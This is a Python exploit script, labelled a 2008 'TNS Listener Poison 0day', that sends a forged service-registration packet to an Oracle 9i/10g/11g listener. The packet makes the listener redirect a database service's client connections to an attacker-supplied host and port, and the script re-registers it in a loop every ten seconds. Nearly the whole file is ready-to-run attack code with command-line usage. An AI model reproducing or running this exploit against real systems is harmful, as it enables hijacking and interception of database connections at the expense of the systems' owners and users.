#!/usr/bin/python

"""
Oracle 9i, 10g and 11g TNS Listener Poison 0day exploit
Copyright (c) Joxean Koret 2008
"""

import sys
import time
import struct
import socket

from libtns import *

def main(host, aport, service, targetHost, targetPort):

    if len(service) != 6:
        print "[!] Sorry! This version just poisons 6 characters long database names"
        sys.exit(2)

    if len(aport) > 4:
        print "[!] Sorry! This version only works with at most 4 characters long port numbers"
        sys.exit(3)

    if len(host) > 32:
        print "[!] Sorry! The server name must be at most 32 characters long"
        sys.exit(4)

    target = host.ljust(32)
    port = aport.ljust(4)

    hostDescription = '(HOST=%s)\x00' % target
    hostDescriptionSize = 40
    serviceDescription = '%s\x00' % service
    serviceDescriptionSize = 7
    instance1Description = '%sXDB\x00' % service
    instance1DescriptionSize = 10
    instance2Description = '%s_XPT\x00' % service
    instance1DescriptionSize = 11
    clientDescription = '(ADDRESS=(PROTOCOL=tcp)(HOST=%s)(PORT=57569))\x00' % target
    clientDescriptionSize = 76
    dispatcherDescription = 'DISPATCHER <machine: %s, pid: 11447>\x00' % target
    dispatcherDescriptionSize = 67
    redirectTo = '(ADDRESS=(PROTOCOL=TCP)(HOST=%s)(PORT=%s))\x00' % (target, port)
    redirectToSize = 75
    handlerName = 'D000\x00'
    handlerSize = 5

    buf = '\x04N\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x04D \x08'
    buf += '\xff\x03\x01\x00\x12444448\x10\x102\x102\x10'
    buf += '2\x102\x102Tv\x008\x102TvD\x00\x00'
    buf += '\x80\x02\x00\x00\x00\x00\x04\x00\x00\x08m\xd2\x0e\x90\x00#'
    buf += '\x00\x00\x00'
    buf += 'BEC76C2CC136-5F9F-E034-0003BA1374B3'
    buf += '\x03'
    buf += '\x00e\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\xd4\x03'
    buf += '\x00\x80\x05\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x01\x00'
    buf += '\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\xc42\xd0\x0e\x01\x00'
    buf += '\x00\x00\xcc\x01'
    buf += '\xf9'
    buf += '\xb7\x00\x00\x00\x00'
    buf += '\xd0t\xd1\x0eS\xcc'
    buf += '\xd3f \x0f\x07V\xe0@\x00\x7f\x01\x00,\xa1\x07\x00'
    buf += '\x00\x00D\x8cx*(\x00\x00\x00\xa4\x02\xf9\xb7\x1e\x00'
    buf += '\x00\x00\x00\x14\x00\x00\x01\x00\x00\x00\xaa\x00\x00\x00\x00\x00'
    buf += '\x00\x00\x00\x00\x00\x00\xb82\xd0\x0e'
    buf += serviceDescription
    buf += hostDescription
    buf += '\x01\x00\x00\x00\n\x00\x00\x00\x01\x00\x00\x000\xc6g*'
    buf += '\x02\x00\x00\x00\x14\xc6g*\x00\x00\x00\x000t\xd1\x0e'
    buf += instance1Description
    buf += '\n\x00\x00\x000\xc6'
    buf += 'g*\x05\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00'
    buf += '\x00\x00\x10p\xd1\x0e'
    buf += instance1Description
    buf += '\x01\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00<>v*'
    buf += '\x02\x00\x00\x00 >v*\x00\x00\x00\x00\xe0s\xd1\x0e'
    buf += instance2Description
    buf += '\x0b\x00\x00\x00<'
    buf += '>v*\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    buf += '\x00\x00\x00\xb0I\xd0\x0e'
    buf += instance2Description
    buf += '\x01\x00\x00\x00\x07\x00\x00\x00\x01\x00\x00\x00@@\x83!'
    buf += '\x02\x00\x00\x00$@\x83!\x00\x00\x00\x00 u\xd1\x0e'
    buf += serviceDescription
    buf += '\x07\x00\x00\x00@@\x83!\x04'
    buf += '\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x80'
    buf += 'I\xd0\x0e'
    buf += serviceDescription
    buf += '\x01\x00\x00\x00\x10\x00'
    buf += '\x00\x00\x02\x00\x00\x00'
    #buf += 'L' # Size of the client description???? L -> 76 -> 0x4C
    buf += chr(len(clientDescription))
    buf += 'p\xd1\x0e\x04\x00\x00\x000s\xf9'
    buf += '\xb7\x00\x00\x00\x00\x80t\xd1\x0eS\xcc\xd3f \x15\x07'
    buf += 'V\xe0@\x00\x7f\x01\x00,\xa1\x05\x00\x00\x00\xfc\x8d\x98'
    buf += '(L\x00\x00\x00T@\x83!C\x00\x00\x00ps\xf9'
    buf += '\xb7'
    buf += '\x00\x08\x00\x00' # Handler Current
    buf += '\x00\x04\x00\x00' # Handler Max
    buf += '\x04\x10' # Handler something? Don't know...
    buf += '\x00\x00\x01\x00\x00'
    buf += '\x00\xd0}u*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    buf += '\x00@p\xd1\x0e'
    buf += handlerName
    buf += clientDescription
    buf += dispatcherDescription
    buf += '\x01' # Number of handlers?????
    buf += '\x00\x00\x00\x10'
    buf += '\x00\x00\x00\x02\x00\x00\x01T4\xd0'
    buf += '\x0e\x04\x00\x00\x00\xf8s\xf9\xb7\x00\x00\x00\x00\x00\x00\x00'
    buf += '\x00S\xcc\xd3f \x11\x07V\xe0@\x00\x7f\x01\x00,\xa1'
    buf += '\x14\xc6g*\n\x00\x00\x00\x1cX@\x0cK\x00\x00\x00'
    buf += '\xac@\x83!\x0e\x00\x00\x00lX@\x0c\x03\x00\x00\x00'
    buf += '\x95\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\xc8\x8cx*'
    buf += '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H4\xd0\x0e'
    buf += 'DEDICATED\x00'
    buf += redirectTo
    buf += 'REMOTE SERVER\x00'
    buf += '\n\x00'
    buf += '\x00\x000\xc6g*\x05\x00\x00\x00\x00\x00\x00\x00\x01\x00'
    buf += '\x00\x00\x00\x00\x00\x00\x10p\xd1\x0e'
    buf += instance1Description
    buf += '$@\x83! >v*\x00\x00\x00\x00\x07\x00\x00\x00'
    buf += '@@\x83!\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
    buf += '\x00\x00\x00\x00\x80I\xd0\x0e'
    buf += serviceDescription
    buf += '\x0b'
    buf += '\x00\x00\x00<>v*\x04\x00\x00\x00\x00\x00\x00\x00\x00'
    buf += '\x00\x00\x00\x00\x00\x00\x00\xb0I\xd0\x0e'
    buf += instance2Description
    buf += '\x00\x00'

    while 1:
        pkt = TNSPacket()
        mbuf = pkt.getPacket("(CONNECT_DATA=(COMMAND=service_register_NSGR))")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((targetHost, int(targetPort)))
        print "Sending initial buffer ..."
        s.send(mbuf)
        res = s.recv(8192)

        tnsRes = TNSBasePacket()
        tnsRes.readPacket(res)
        print "Answer: %s(%d)" % (tnsRes.getPacketTypeString(),  ord(tnsRes.packetType))

        print "Sending registration ..."
        print repr(buf)[:80]
        s.send(buf)
        res = s.recv(8192)

        tnsRes = TNSBasePacket()
        tnsRes.readPacket(res)
        print "Answer: %s(%d)" % (tnsRes.getPacketTypeString(),  ord(tnsRes.packetType))
        print repr(res)
        print "Sleeping for 10 seconds... (Ctrl+C to stop)..."
        time.sleep(10)
        s.close()

def showTnsError(res):
    pos = res.find("DESCRIPTION")
    print "TNS Listener returns an error:"
    print
    print "Raw response:"
    print repr(res)
    print
    print "Formated response:"
    formatter = TNSDataFormatter(res[pos-1:])
    print formatter.format()

    tns = TNS()
    errCode = tns.extractErrorcode(res)

    if errCode:
        print "TNS-%s: %s" % (errCode, tns.getTnsError(errCode))

def usage():
    print "Usage:", sys.argv[0], "<our_address> <our_port> <service_name> <target_address> <target_port>"
    print

if __name__ == "__main__":
    if len(sys.argv) < 6:
        usage()
        sys.exit(1)
    else:
        main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])

